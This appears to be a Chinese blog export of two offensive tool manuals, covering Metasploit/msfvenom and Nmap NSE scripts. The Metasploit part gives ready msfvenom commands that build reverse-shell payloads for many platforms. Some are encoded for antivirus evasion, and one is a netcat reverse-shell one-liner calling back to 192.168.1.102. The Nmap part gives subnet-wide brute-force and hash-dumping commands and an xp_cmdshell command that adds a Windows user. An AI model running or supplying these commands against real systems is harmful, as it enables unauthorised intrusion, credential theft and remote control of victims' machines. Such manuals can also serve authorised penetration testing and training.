取消设置一个或多个全局变量version 显示框架和控制台库版本号模块命令&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;advanced 显示一个或多个模块的高级选项back 从当前上下文返回edit 使用首选编辑器编辑当前模块info 显示有关一个或多个模块的信息loadpath 路径从路径搜索并加载模块options 显示全局选项或一个或多个模块popm 将最新的模块从堆栈中弹出并使其处于活动状态previous 将之前加载的模块设置为当前模块pushm 将活动或模块列表推入模块堆栈reload_all 从所有定义的模块路径重新加载所有模块search 搜索模块名称和描述show 显示给定类型的模块或所有模块use 按名称选择模块工作命令&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;handler 作为作业启动负载处理程序jobs 显示和管理作业kill 杀死一个工作rename_job 重命名作业资源脚本命令&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;makerc 保存从开始到文件输入的命令resource 运行存储在文件中的命令数据库后端命令&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;db_connect 连接到现有的数据库db_disconnect 断开与当前数据库实例的连接db_export 导出包含数据库内容的文件db_import 导入扫描结果文件（文件类型将被自动检测）db_nmap 执行nmap并自动记录输出db_rebuild_cache 重建数据库存储的模块高速缓存db_status 显示当前的数据库状态hosts 列出数据库中的所有主机loot 列出数据库中的所有战利品notes 列出数据库中的所有笔记services 列出数据库中的所有服务vulns 列出数据库中的所有漏洞workspace 在数据库工作区之间切换凭证后端命令&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;creds 列出数据库中的所有凭据&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 帮助命令在msf中关于help功能，有三种方式，分别是 “?” 、“help”、“-h”。系统命令的习惯也是保留的 show它的作用是显示当前所有可利用资源, 正常使用的时候，show 模块名称就可以了。 show options 查看需要配置的选项 show missing 是显示缺失的必填项。 show payload 如果你的所查询漏洞是只在lunix平台下的，出来的只会是针对lunix平台的payloads 核心命令 connect 瑞士军刀netcat 1 [*] Connected to 127.0.0.1:22 SSH-2.0-OpenSSH_8.0 12341. search- search的功能可以让我们随时在msf的海量脚本中拿到我们想要的。 12- msf5 &gt; search mysql Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/http/manageengine_pmp_privesc 2014-11-08 normal Yes ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection 12341. use- 使用选中模块 12- msf5 &gt; use exploit/windows/mysql/mysql_start_up msf5 exploit(windows/mysql/mysql_start_up) &gt; 1234561. info- info命令用于查看当前模块信息- basic options 中的内容就是我们需要配置的内容。 12- msf5 exploit(windows/mysql/mysql_start_up) &gt; info windows/mysql/mysql_start_up Name: Oracle MySQL for Microsoft Windows FILE Privilege Abuse Module: exploit/windows/mysql/mysql_start_up Platform: Windows Arch: Privileged: No License: Metasploit Framework License (BSD) Rank: Excellent Disclosed: 2012-12-01 ............. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051521. set- set命令进行赋值操作。1. edit- 其实就是以vi命令打开选中的脚本文件1. unset - 取消赋值1. run&#x2F;exploit 这- 两个命令都是运行脚本，其实功能完全一致，只是习惯上exploit再exploits模块下 使用，仅此而已。1. job&#x2F;kill- jobs命令在你运行脚本的时候会记录工作进程，kill对应干掉它（随着我跟开发接触越来越多，发现老开发从不说删掉，都是干掉！干掉！干掉！！1. sessions- 当你的脚本与目标服务器建立链接，或者说拿到了shell时，你输入sessions命令可以看到具体的监听端口。1. resource - 可以直接执行我们预定好的操作## msf模块### MSF架构1. Rex功能库实际来讲并不属于MSF，为什么这么讲呢？如HTTP&#x2F;TELNET&#x2F;SSH等连接功能严格来讲是属于操作系统自带的功能，MSF只是去以一个用户的身份去调用它而已；同理上述提到的编码功能。2. Core库是真正属于MSF的最底层的库，其中包含的都是MSF框架的底层功能，如数据管理，session管理，插件管理这些核心底层功能。3. Base库是在针对Core库进行进一步人性化的拓展的库，算作一个中间层，为开发者提供API以轻松调用MSF的功能，我们使用的各种插件，我们上期提到的console接口，还有收费版的UI界面，以及自己开发的插件，都是在base库的基础上进一步拓展的。4. Plugin插件，这里提到的插件与我刚刚讲到的有略微差异，他这里提到的插件指的是成熟的工具&#x2F;软件，如各种成熟的扫描器，老牌扫描厂商的存在，已经不需要MSF再去开发新的插件啦，直接调用就好啦。### Exp和Poc- 通常 Exp 和 PoC 都是可执行的漏洞利用脚本&#x2F;程序 ，- 区别主要在于是否恶意，1. PoC 是 Proof of Concept (概念验证) 通常是内含无害的漏洞代码，比如弹出一个计算器什么的2. Exp 是 Exploit (漏洞利用) 通常是内含恶意的漏洞代码- 我们现在着重看一下exploits和payloads的内容，当然啦，这里的exploits正是我们刚刚提到的exp- exp在msf中来讲，其实本身并没有恶意行为，只是它会调用恶意payloads来进行测试，### 模块(modules)1. msf有六大模块 121. ls /opt/metasploit/modules auxiliary evasion nops post encoders exploits payloads 123456789- 预辅助模块（auxiliary)：执行信息收集，枚举，指纹探测，扫描等功能的辅助模块(没有payload的exploit模块)- 渗透模块(exploits)：利用系统漏洞进行攻击动作，此模块对应每一个具体漏洞的攻击方法（主动，被动）- 攻击荷载(payloads)：成功exploit之后，真正在目标系统中执行的代码或者命令- 后渗透模块(posts)：- 空字段模块(nops)：提高payload稳定性及维持大小- 编码模块(Encoders)：对payload进行加密，躲过av检查的模块1. exploits分类 12 ls /opt/metasploit/modules/exploits aix bsdi freebsd mainframe qnx android dialup hpux multi solaris apple_ios example.rb irix netware unix bsd firefox linux osx windows 12payloads分类 121. ls /opt/metasploit/modules/payloads singles stagers stages 12345678910- Single有点类似我们常说的大马，它不依赖任何环境或组件，只要它成功上传，它就可以实现它所有的功能。- stager有点类似我们常说的一句话，它只是用于建立连接。- stages完全是为了搭配前者使用，这时候出于黑客逻辑肯定会问，为什么不接着上传第一步的single，答：stages-payload的功能更倾向于底层，执行系统命令### 常用exp#### 扫描1. snmp枚举模块 12 12 auxiliary/scanner/snmp/snmp_enum normal Yes SNMP Enumeration Module 12tcp扫描 121. 0 auxiliary/scanner/portscan/tcp normal Yes TCP Port Scanner 1234#### 爆破1. ssh爆破 121. 17 auxiliary/scanner/ssh/ssh_login normal Yes SSH Login Check Scanner 1234567891011121314151617181920212223242526272829303132## 后门生成### msfvenom常用选项- -p, –payload 指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&#39;-&#39;或者stdin指定- -l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all- -n, –nopsled 为payload预先指定一个NOP滑动长度- -f, –format 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)- -e, –encoder [encoder] 指定需要使用的encoder（编码器）- -a, –arch 指定payload的目标架构- –platform 指定payload的目标平台- -s, –space 设定有效攻击荷载的最大长度- -b, –bad-chars 设定规避字符集，比如: &#39;\\x00\\xff&#39;- -i, –iterations 指定payload的编码次数- -c, –add-code 指定一个附加的win32 shellcode文件- -x, –template 指定一个自定义的可执行文件作为模板- -k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行- –payload-options 列举payload的标准选项- -o, –out 保存payload- -v, –var-name 指定一个自定义的变量，以确定输出格式- –shellest 最小化生成payload- -h, –help 查看帮助选项- –help-formats 查看msf支持的输出格式列表### 生成payload- 生成payload，有有两个必须的选项：-p -f - 使用-p 来指定要使用的payload。- 可以使用下面的命令来查看所有msf可用的payload列表 12 ./msfvenom -l payloads 12-p选项也支持使用使用自定义的payload，需要使用 “-“，比如: cat payload_file.bin | ./msfvenom -p - -a x86 –platform win -e x86/shikata_ga_nai -f raw 1234使用-f 来指定payload的输出格式举例： ./msfvenom -p windows/meterpreter/bind_tcp -f exe 12使用下面的命令，可以产看msf支持的输出格式 ./msfvenom –help-formats 12一个典型的msfvenom使用举例如下： 12- $ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&#039;s IP] lport=4444 -f exe -o /tmp/my_payload.exe 123456### 对payload进行编码- 如果你使用了-b选项（设定了规避字符集），会自动调用编码器。- 其他情况下，你需要使用-e选项来使用编码模块，例如： 12 ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw 12可以使用下面的命令，来查看可用的编码器 ./msfvenom -l encoders 1234你也可以使用-i选项进行多次编码。某些情况下，迭代编码可以起到规避杀毒软件的作用，但你需要知道，编码并没有使用一个真正意义上的AV规避方案。可以使用下面的命令来进行迭代编码： 12- ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 1234### 规避字符- 使用-b选项意味着在生成payload的时候对某些字符进行规避。当你使用这个选项的时候，msfvenom会自动的使用合适的编码器对payload进行编码，比如： 12- ./msfvenom -p windows/meterpreter/bind_tcp -b &#039;\\x00&#039; -f raw 1234### 使用自定义可执行文件模板- 默认的，msfvenom使用的模板文件保存在msf&#x2F;data&#x2F;templates目录中，如果你想使用你自己的模板文件，你可以使用-x选项来指定，比如： 12- ./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe 123456789101112- 这个命令将使用windows下计算器程序（calc.exe）作为可执行文件的模板生成payload。- 注意：如果你想要创建一个windows的x64的可执行文件模板来生成一个x64的payload，你只能使用exe格式的模板。- 使用-x选项经常和-k选项配合使用，-k选项会将你的payload作为一个新的进程运行。但目前这个选项只支持老版本的windows系统比如windows xp### 常用示例- 在攻击机的msf中启动监听模块，use exploit&#x2F;multi&#x2F;handler，并设置相应的payload，payload的选择取决于生成被控端文件用了什么模块，名字都是一样的。接着options设置好相应的参数。1. windows msf shell反弹 12 msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b ‘\\x00\\x0a\\xff’ -i 3 -f exe -o payload.exe 12mac msf shell反弹 msfvenom -a x86 –platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho 12android msf shell反弹 &#x2F;&#x2F;需要签名 msfvenom -a x86 –platform Android -p android/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk 12powershell msf shell反弹 msfvenom -a x86 –platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1 12linux msf shell反弹 msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf 12php msf shell反弹 msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php 12aspx msf shell反弹 msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx 12jsp msf shell反弹 msfvenom –platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.jsp 12war msf shell反弹 msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.war 12js msf shell反弹 msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.js 12python msf shell反弹 msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py 12perl msf shell反弹 msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.pl 12ruby msf shell反弹 msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.rb 12lua msf shell反弹 msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -opayload.lua 12windows shellcode: msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c 12linux shellcode msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c 12mac shellcode msfvenom -a x86 –platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IPLPORT=攻击机端口 -f c 12生成nc反弹一句话 121. msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R mkfifo /tmp/lerttd; nc 192.168.1.102 8888 0&lt;/tmp/lerttd | /bin/sh &gt;/tmp/lerttd 2&gt;&1; rm /tmp/lerttd ``` ​","categories":[{"name":"工具手册","slug":"工具手册","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"}],"tags":[{"name":"后渗透工具","slug":"后渗透工具","permalink":"http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"}]},{"title":"Nmap手册","slug":"nmap手册","date":"2020-01-25T15:24:29.000Z","updated":"2020-02-25T15:01:18.830Z","comments":true,"path":"2020/01/25/nmap手册/","link":"","permalink":"http://yoursite.com/2020/01/25/nmap%E6%89%8B%E5%86%8C/","excerpt":"","text":"Nmap受到攻击者和管理员的欢迎，因为它非常有效且可靠。它是网络诊断和网络系统评估的重要组成部分。除此之外，漏洞扫描程序 Nessus还使用它来检测开放端口。 参数目标选取-iL filename 从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段-iR hostnum 随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描–exclude host1[, host2] 从扫描任务中需要排除的主机–exculdefile exclude_file 排除文件中的IP,格式和-iL指定扫描文件的格式相同 主机发现-sL 仅仅是显示,扫描的IP数目,不会进行任何扫描-sn ping扫描,即主机发现-Pn 不检测主机存活-PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM 使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list] 使用IP协议包探测对方主机是否开启-n/-R 不对IP进行域名反向解析/为所有的IP都进行域名的反响解析–dns-servers 制定dns服务器地址–system-dns 使用系统DNS–traceroute: 跟踪每个主机的路径 扫描技巧-sS/sT/sA/sW/sM TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU UDP扫描-sN/sF/sX TCP Null，FIN，and Xmas扫描–scanflags 自定义TCP包中的flags-sI zombie host[:probeport] Idlescan-sY/sZ SCTP INIT/COOKIE-ECHO 扫描-sO 使用IP protocol 扫描确定目标机支持的协议类型-b “FTP relay host” 使用FTP bounce scan 指定端口和扫描顺序-p 特定的端口 -p80,443 或者 -p1-65535-p U:PORT 扫描udp的某个端口, -p U:53-F 快速扫描模式,比默认的扫描端口还少-r 不随机扫描端口,默认是随机扫描的–top-ports “number” 扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个–port-ratio “ratio” 扫描指定频率以上的端口 服务版本识别-sV 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测–version-intensity “level” 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7–version-light 打开轻量级模式,为–version-intensity 2的别名–version-all 尝试所有探测,为–version-intensity 9的别名–version-trace 显示出详细的版本侦测过程信息 脚本扫描-sC 根据端口识别的服务,调用默认脚本–script=”Lua scripts” 调用的脚本名–script-args=n1=v1,[n2=v2] 调用的脚本传递的参数–script-args-file=filename 使用文本传递参数–script-trace 显示所有发送和接收到的数据–script-updatedb 更新脚本的数据库–script-help=”Lua script” 显示指定脚本的帮助 OS识别-O 启用操作系统检测,-A来同时启用操作系统检测和版本检测–osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)–osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配 防火墙/IDS躲避和哄骗-f; –mtu value 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME 使用诱饵隐蔽扫描-S IP-ADDRESS 源地址欺骗-e interface 使用指定的接口-g/ –source-port PROTNUM 使用指定源端口–proxies url1,[url2],… 使用HTTP或者SOCKS4的代理–date 设置包内发送的数据、–date-string 设置发送的字符串–data-length NUM 填充随机数据让数据包长度达到NUM–ip-options OPTIONS 使用指定的IP选项来发送数据包–ttl VALUE 设置IP time-to-live域–spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装–badsum 使用错误的checksum来发送数据包 Nmap 输出-oN 将标准输出直接写入指定的文件-oX 输出xml文件-oS 将所有的输出都改为大写-oG 输出便于通过bash或者perl处理的格式,非xml-oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v 提高输出信息的详细度-d level 设置debug级别,最高是9–reason 显示端口处于带确认状态的原因–open 只输出端口状态为open的端口–packet-trace 显示所有发送或者接收到的数据包–iflist 显示路由信息和接口,便于调试–log-errors 把日志等级为errors/warings的日志输出–append-output 追加到指定的文件–resume FILENAME 恢复已停止的扫描–stylesheet PATH/URL 设置XSL样式表，转换XML输出–webxml 从namp.org得到XML的样式–no-sytlesheet 忽略XML声明的XSL样式表 时间性能优化-T 时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)-F 快速扫描。–max-retries 调整重传次数。–min-hostgroup/–max-hostgroup size 设置组的大小–min-parallelism/–max-parellelism time 指定时间内的探针数–min-rtt-timrout/–max-rtt-timrout/initial-rtt-timrouttime 指定探针超时–scan-delay/-max-scan-delay time 指定探针之间的时延–max-retries tries 指定探针重传转发数–host-timeout time 设置扫描主机的最大时间–defeat-rst-ratelimit 设置rst的限制 其他Nmap选项-6 开启IPv6-A OS识别,版本探测,脚本扫描和traceroute–datedir DIRNAME 说明用户Nmap数据文件位置–send-eth / –send-ip 使用原以太网帧发送/在原IP层发送–privileged 假定用户具有全部权限–unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限-V 打印版本信息-h 输出帮助 脚本和ftp相关的漏洞检测脚本21ftp-anon.nse 检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量ftp抓鸡 12# nmap -p 21 --script ftp-anon.nse -v 192.168.3.23 ftp-brute.nse ftp爆破脚本 [只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个爆破速度可能会更慢),毕竟,是直接在公网爆破] 12# nmap -p 21 --script ftp-brute.nse -v 192.168.3.23 ftp-vuln-cve2010-4221.nse ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出 12# nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23 ftp-proftpd-backdoor.nse ProFTPD 1.3.3c 被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令 12# nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23 ftp-vsftpd-backdoor.nse VSFTPD v2.3.4 跟Proftp同样的问题,被人插了后门 12# nmap -p 21 --script ftp-vsftpd-backdoor.nse -v 192.168.3.23 和ssh相关的扫描脚本22sshv1.nse sshv1是可以中间人的 12# nmap -p 22 --script sshv1.nse -v 192.168.3.23 和smtp相关的脚本25smtp-brute.nse 简单爆破smtp 12# nmap -p 25 --script smtp-brute.nse -v 192.168.3.23 smtp-enum-users.nse 枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行 12# nmap -p 25 --script smtp-enum-users.nse -v 192.168.3.23 smtp-vuln-cve2010-4344.nse Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出 12# nmap -p 25 --script smtp-vuln-cve2010-4344.nse -v 192.168.3.23 smtp-vuln-cve2011-1720.nse Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出 12# nmap -p 25 --script smtp-vuln-cve2011-1720.nse -v 192.168.3.23 smtp-vuln-cve2011-1764.nse Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞,太老基本很难遇到了 12# nmap -p 25 --script smtp-vuln-cve2011-1764.nse -v 192.168.3.23 和pop3相关的扫描脚本110,995pop3-brute.nse pop简单弱口令爆破 12# nmap -p 110 --script pop3-brute.nse -v 192.168.3.23 和imap相关的一些扫描脚本143,993imap-brute.nse imap简单弱口令爆破 12# nmap -p 143,993 --script imap-brute.nse -v 192.168.3.23 和dns相关的扫描脚本53dns-zone-transfer.nse 检查目标ns服务器是否允许传送 123# nmap -p 53 --script dns-zone-transfer.nse -v 192.168.3.23# nmap -p 53 --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain&#x3D;target.org -v 192.168.3.23 hostmap-ip2hosts.nse 旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉 12# nmap -p80 --script hostmap-ip2hosts.nse 192.168.3.23 和数据库相关的扫描脚本informix-brute.nse informix爆破脚本9088 12# nmap -p 9088 --script informix-brute.nse 192.168.3.23 mysql-empty-password.nse mysql 扫描root空密码3306 12# nmap -p 3306 --script mysql-empty-password.nse -v 192.168.3.23 mysql-brute.nse mysql root弱口令简单爆破3306 12# nmap -p 3306 --script mysql-brute.nse -v 192.168.3.23 mysql-dump-hashes.nse 导出mysql中所有用户的hash3306 12# nmap -p 3306 --script mysql-dump-hashes --script-args&#x3D;&#39;username&#x3D;root,password&#x3D;root&#39; 192.168.3.23 mysql-vuln-cve2012-2122.nse Mysql身份认证漏洞[MariaDB and MySQL 5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装的,这样的成功率相对较高]3306 12# nmap -p 3306 --script mysql-vuln-cve2012-2122.nse -v 192.168.3.23 ms-sql-info.nse 扫描C段mssql 123# nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port&#x3D;1433 -v 192.168.3.0&#x2F;24# nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port&#x3D;1433 -v 192.168.3.0&#x2F;24 ms-sql-empty-password.nse 扫描mssql sa空密码 12# nmap -p 1433 --script ms-sql-empty-password.nse -v 192.168.3.0&#x2F;24 ms-sql-xp-cmdshell.nse 利用xp_cmdshell,远程执行系统命令1433 12# nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username&#x3D;sa,mssql.password&#x3D;sa,ms-sql-xp-cmdshell.cmd&#x3D;&quot;net user test test &#x2F;add&quot; 192.168.3.0&#x2F;24 ms-sql-dump-hashes.nse 导出mssql中所有的数据库用户及密码hash1433 12# nmap -p 1433 --script ms-sql-dump-hashes -v 192.168.3.0&#x2F;24 pgsql-brute.nse 尝试爆破postgresql5432 12# nmap -p 5432 --script pgsql-brute -v 192.168.3.0&#x2F;24 oracle-brute-stealth.nse 尝试爆破oracle1521 12# nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid&#x3D;ORCL -v 192.168.3.0&#x2F;24 mongodb-brute.nse 尝试爆破mongdb27017 12# nmap -p 27017 --script mongodb-brute 192.168.3.0&#x2F;24 redis-brute.nse redis爆破6379 12# nmap -p 6379 --script redis-brute.nse 192.168.3.0&#x2F;24 oracle-brute.nse oracle爆破1521 12# nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid&#x3D;ORCL -v 192.168.3.0&#x2F;24 和snmp相关的脚本snmp-brute.nse 爆破C段的snmp 12# nmap -sU --script snmp-brute --script-args snmp-brute.communitiesdb&#x3D;user.txt 192.168.3.0&#x2F;24 和ldap服务相关的一些利用脚本ldap-brute.nse 简单爆破ldap 12# nmap -p 389 --script ldap-brute --script-args ldap.base&#x3D;&#39;&quot;cn&#x3D;users,dc&#x3D;cqure,dc&#x3D;net&quot;&#39; 192.168.3.0&#x2F;24 和各类web中间件,web集成环境相关的一些利用脚本xmpp-brute.nse xmpp爆破 12# nmap -p 5222 --script xmpp-brute.nse 192.168.3.0&#x2F;24 http-iis-short-name-brute.nse 短文件扫描 12# nmap -p80 --script http-iis-short-name-brute.nse 192.168.3.0&#x2F;24 http-iis-webdav-vuln.nse iis 5.0 /6.0 webadv写 12# nmap --script http-iis-webdav-vuln.nse -p80,8080 192.168.3.0&#x2F;24 http-shellshock.nse bash远程执行 12# nmap -sV -p- --script http-shellshock --script-args uri&#x3D;&#x2F;cgi-bin&#x2F;bin,cmd&#x3D;ls 192.168.3.0&#x2F;24 http-svn-info.nse 探测目标svn 12# nmap --script http-svn-info 192.168.3.0&#x2F;24 http-drupal-enum.nse 其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来http-wordpress-brute.nse 12# nmap -p80 -sV --script http-wordpress-brute --script-args &#39;userdb&#x3D;users.txt,passdb&#x3D;passwds.txt,http-wordpress-brute.hostname&#x3D;domain.com,http-wordpress-brute.threads&#x3D;3,brute.firstonly&#x3D;true&#39; 192.168.3.0&#x2F;24 http-backup-finder.nse 扫描目标网站备份 12# nmap -p80 --script&#x3D;http-backup-finder 192.168.3.0&#x2F;24 http-vuln-cve2015-1635.nse iis6.0远程代码执行 12# nmap -sV --script http-vuln-cve* --script-args uri&#x3D;&#39;&#x2F;anotheruri&#x2F;&#39; 192.168.3.0&#x2F;24 跟vpn相关的一些脚本pptp-version.nse 识别目标pptp版本 12# nmap -p 1723 --script pptp-version.nse 192.168.3.0&#x2F;24 smb漏洞检测脚本集smb-vuln-ms08-067.nsesmb-vuln-ms10-054.nsesmb-vuln-ms10-061.nsesmb-vuln-ms17-010.nse smb远程执行 12# nmap -p445 --script smb-vuln-ms17-010.nse 192.168.3.0&#x2F;24 检测内网嗅探sniffer-detect.nse 12# nmap -sn -Pn --script sniffer-detect.nse 192.168.3.0&#x2F;24 其它的一些辅助性脚本rsync-brute.nse 爆破目标的rsync 12# nmap -p 873 --script rsync-brute --script-args &#39;rsync-brute.module&#x3D;www&#39; 192.168.3.0&#x2F;24 rlogin-brute.nse 爆破目标的rlogin 12# nmap -p 513 --script rlogin-brute 192.168.3.0&#x2F;24 vnc-brute.nse 爆破目标的vnc 12# nmap --script vnc-brute -p 5900 192.168.3.0&#x2F;24 pcanywhere-brute.nse 爆破pcanywhere 12# nmap -p 5631 --script&#x3D;pcanywhere-brute 192.168.3.0&#x2F;24 nessus-brute.nse 爆破nessus,貌似现在已经不是1241端口了 12# nmap --script nessus-brute -p 1241 192.168.3.0&#x2F;24 nexpose-brute.nse 爆破nexpose 12# nmap --script nexpose-brute -p 3780 192.168.3.0&#x2F;24 shodan-api.nse 配合shodan接口进行扫描,如果自己手里有0day,这个威力还是不可小觑的 12# nmap --script shodan-api --script-args &#39;shodan-api.target&#x3D;192.168.3.0&#x2F;24,shodan-api.apikey&#x3D;SHODANAPIKEY&#39; 尝试利用nmap一句话进行目标C段常规漏洞扫描nmap -sT -Pn -v –script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012-1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.3.0/24 nmap一句话进行目标C段弱口令爆破nmap -sT -v -Pn –script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 